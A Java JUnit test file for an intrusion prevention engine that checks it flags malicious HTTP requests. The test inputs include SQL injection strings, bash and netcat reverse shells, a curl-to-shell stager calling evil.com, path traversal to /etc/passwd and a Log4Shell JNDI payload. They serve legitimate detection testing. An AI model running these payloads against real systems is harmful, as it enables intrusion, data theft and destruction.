/*
 * This file is part of KotSafe.
 * GPL-3.0 License — see <http://www.gnu.org/licenses/>
 */

package com.kotsafe.security;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertTrue;

import com.kotsafe.security.decoders.HttpsDecoder;
import com.kotsafe.security.ips.IpsEngine;

import org.junit.Test;

import java.nio.charset.StandardCharsets;
import java.util.Collections;
import java.util.HashMap;
import java.util.Map;

public class IpsEngineTest {

    @Test
    public void testSqlInjectionDetection() {
        // 1. Boolean auth bypass
        IpsEngine.IpsMatch m1 = IpsEngine.inspect("GET", "/login?user=admin' or '1'='1", null, null);
        assertTrue(m1.hasThreat);
        assertEquals("SQLI", m1.category);
        assertEquals("CRITICAL", m1.severity);

        // 2. UNION SELECT in POST body
        byte[] body = "id=1 union all select null, username, password from users".getBytes(StandardCharsets.UTF_8);
        IpsEngine.IpsMatch m2 = IpsEngine.inspect("POST", "/search", null, body);
        assertTrue(m2.hasThreat);
        assertEquals("SQLI", m2.category);

        // 3. Destructive DROP TABLE
        IpsEngine.IpsMatch m3 = IpsEngine.inspect("POST", "/api", null, "query=1; DROP TABLE customers".getBytes(StandardCharsets.UTF_8));
        assertTrue(m3.hasThreat);
        assertEquals("SQLI", m3.category);
    }

    @Test
    public void testRemoteCodeExecutionDetection() {
        // 1. Interactive reverse shell
        IpsEngine.IpsMatch m1 = IpsEngine.inspect("GET", "/cgi-bin/test?cmd=;bash -i >& /dev/tcp/10.0.0.1/8080 0>&1", null, null);
        assertTrue(m1.hasThreat);
        assertEquals("RCE", m1.category);
        assertEquals("CRITICAL", m1.severity);

        // 2. Pipe to shell download stager
        IpsEngine.IpsMatch m2 = IpsEngine.inspect("POST", "/exec", null, "curl http://evil.com/miner | sh".getBytes(StandardCharsets.UTF_8));
        assertTrue(m2.hasThreat);
        assertEquals("RCE", m2.category);

        // 3. Netcat reverse shell
        IpsEngine.IpsMatch m3 = IpsEngine.inspect("GET", "/cmd?exec=nc -e /bin/sh 1.2.3.4 4444", null, null);
        assertTrue(m3.hasThreat);
        assertEquals("RCE", m3.category);
    }

    @Test
    public void testPathTraversalDetection() {
        IpsEngine.IpsMatch m1 = IpsEngine.inspect("GET", "/download?file=../../../../etc/passwd", null, null);
        assertTrue(m1.hasThreat);
        assertEquals("TRAVERSAL", m1.category);

        IpsEngine.IpsMatch m2 = IpsEngine.inspect("GET", "/view?page=..\\..\\windows\\system.ini", null, null);
        assertTrue(m2.hasThreat);
        assertEquals("TRAVERSAL", m2.category);
    }

    @Test
    public void testLog4ShellDetection() {
        Map<String, String> headers = new HashMap<>();
        headers.put("User-Agent", "${jndi:ldap://log4j.attacker.com/exploit}");

        IpsEngine.IpsMatch m1 = IpsEngine.inspect("GET", "/api/v1", headers, null);
        assertTrue(m1.hasThreat);
        assertEquals("JNDI", m1.category);
        assertEquals("CRITICAL", m1.severity);
    }

    @Test
    public void testScannerUserAgentDetection() {
        Map<String, String> headers = Collections.singletonMap("User-Agent", "sqlmap/1.6#stable (https://sqlmap.org)");
        IpsEngine.IpsMatch m1 = IpsEngine.inspect("GET", "/api/users", headers, null);
        assertTrue(m1.hasThreat);
        assertEquals("SCANNER", m1.category);
    }

    @Test
    public void testSensitiveCreditCardLeakDetection() {
        // Valid Visa test card passing Luhn algorithm: 4242424242424242
        byte[] body = "{\"orderId\": 101, \"cardNumber\": \"4242424242424242\"}".getBytes(StandardCharsets.UTF_8);
        IpsEngine.IpsMatch m = IpsEngine.inspect("POST", "/checkout", null, body);
        assertTrue(m.hasThreat);
        assertEquals("DATA_LEAK", m.category);
        assertTrue(m.matchedSnippet.contains("4242"));
    }

    @Test
    public void testCleanTraffic() {
        Map<String, String> headers = new HashMap<>();
        headers.put("User-Agent", "Mozilla/5.0 Android");
        headers.put("Accept", "application/json");

        IpsEngine.IpsMatch m = IpsEngine.inspect("GET", "/api/v1/profile?user_id=42", headers, "{\"name\":\"John\"}".getBytes(StandardCharsets.UTF_8));
        assertFalse(m.hasThreat);
    }

    @Test
    public void testHttpsDecoderIpsIntegration() {
        String rawAttackRequest = "GET /vulnerable?id=1%20UNION%20SELECT%20null,%20password%20FROM%20users HTTP/1.1\r\n" +
                "Host: target.com\r\n" +
                "User-Agent: Mozilla/5.0\r\n\r\n";

        byte[] payload = rawAttackRequest.getBytes(StandardCharsets.UTF_8);
        HttpsDecoder.DecodedHttps decoded = HttpsDecoder.decode(payload);
        assertNotNull(decoded);
        assertNotNull(decoded.ipsMatch);
        assertTrue(decoded.ipsMatch.hasThreat);
        assertEquals("SQLI", decoded.ipsMatch.category);
        assertTrue(decoded.summary.contains("IPS:"));
        assertTrue(decoded.json.contains("ips_threat_detected"));
    }
}
